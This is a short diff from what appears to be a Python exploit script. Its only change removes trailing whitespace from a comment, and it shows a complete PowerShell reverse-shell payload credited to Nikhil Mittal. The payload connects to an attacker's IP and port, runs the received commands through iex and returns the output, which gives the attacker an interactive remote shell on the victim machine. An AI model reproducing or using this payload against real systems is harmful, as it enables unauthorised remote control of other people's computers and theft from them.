@@ -17,7 +17,7 @@ except:
 # payload from Nikhil Mittal @samratashok
 # https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
 
-# Updated payload to account for Powershell stderr 
+# Updated payload to account for Powershell stderr
 payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);try { $sendback = (iex ". { $data } 2>&1" | Out-String ); } catch { $sendback = "$_`n"}; $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 payload = payload % (ip, port)
 
